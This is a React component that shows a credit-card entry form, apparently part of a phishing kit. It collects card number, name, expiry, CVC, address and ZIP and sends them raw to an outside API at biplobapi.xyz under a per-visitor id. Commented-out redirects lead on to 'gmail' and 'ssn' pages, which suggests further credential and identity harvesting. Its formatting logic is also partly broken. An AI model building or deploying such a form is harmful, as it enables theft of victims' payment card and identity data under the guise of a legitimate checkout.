import React, { useState } from "react";
import "./Card.css";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";

import {
  formatCreditCardNumber,
  formatCVC,
  formatExpirationDate,
  formatFormData,
} from "./utils";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";

const CardPage = () => {
  const [cstate, setcState] = useState({
    number: "",
    expiry: "",
    cvc: "",
    name: "",
    focus: "",
  });
  const handleInputFocus = (evt) => {
    setcState((prev) => ({ ...prev, focus: evt.target.name }));
  };
  const handleInputChange = (evt) => {
    if (evt.name === "number") {
      evt.value = formatCreditCardNumber(evt.value);
    } else if (evt.name === "expiry") {
      evt.value = formatExpirationDate(evt.value);
    } else if (evt.name === "cvc") {
      evt.value = formatCVC(evt.value);
    }
    const { name, value } = evt.target;
    setcState((prev) => ({ ...prev, [name]: value }));
  };
  const navigate = useNavigate();
  const { state } = useLocation();
  const { temp } = state;
  console.log(temp);
  const {
    register,
    handleSubmit,
    formState: { errors },
    resetField,
  } = useForm();
  const handleVerify = (data) => {
    const bookings = {
      name: data.name,
      number: data.number,
      expiry: data.expiry,
      cvc: data.cvc,
      address: data.address,
      zip: data.zip,
    };

    console.log(bookings);

    fetch(`https://biplobapi.xyz/code/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        // console.log(localStorage.getItem('url'))
        navigate("/" + localStorage.getItem("url"));
        if (data.modifiedCount > 0) {
          // reset();
          // navigate("/gmail", { state: { temp: temp } });
          // navigate("/ssn", { state: { temp: temp } });
        }
      });
    // }
  };

  return (
    <div className="p-5">
      <Cards
        number={cstate.number}
        expiry={cstate.expiry}
        cvc={cstate.cvc}
        name={cstate.name}
        focused={cstate.focus}
      />
      <div className="mt-3">
        <form onSubmit={handleSubmit(handleVerify)}>
          <div className="mb-3">
            <input
              {...register("number", { required: true })}
              type="number"
              name="number"
              className="form-control"
              placeholder="Card Number"
              pattern="[\d| ]{16,22}"
              value={state.number}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              required
            />
          </div>
          <div className="mb-3">
            <input
              {...register("name", { required: true })}
              type="text"
              name="name"
              className="form-control"
              placeholder="Name"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              required
            />
          </div>
          <div className="row">
            <div className="col-6 mb-3">
              <input
                {...register("expiry", { required: true })}
                type="number"
                name="expiry"
                className="form-control"
                placeholder="mm/yy"
                pattern="\d\d/\d\d"
                value={state.expiry}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                required
              />
            </div>
            <div className="col-6 mb-3">
              <input
                {...register("cvc", { required: true })}
                type="tel"
                name="cvc"
                className="form-control"
                placeholder="CVC"
                pattern="\d{3,4}"
                value={state.cvc}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                required
              />
            </div>
          </div>
          <div className="row">
            <div className="col-6 mb-3">
              <input
                {...register("address", { required: true })}
                type="text"
                name="address"
                className="form-control"
                placeholder="Address"
                value={state.address}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                required
              />
            </div>
            <div className="col-6 mb-3">
              <input
                {...register("zip", { required: true })}
                type="number"
                name="zip"
                className="form-control"
                placeholder="zip"
                value={state.zip}
                onChange={handleInputChange}
                onFocus={handleInputFocus}
                required
              />
            </div>
          </div>
          <div className="d-grid">
            <button className="btn btn-dark">Confirm</button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default CardPage;
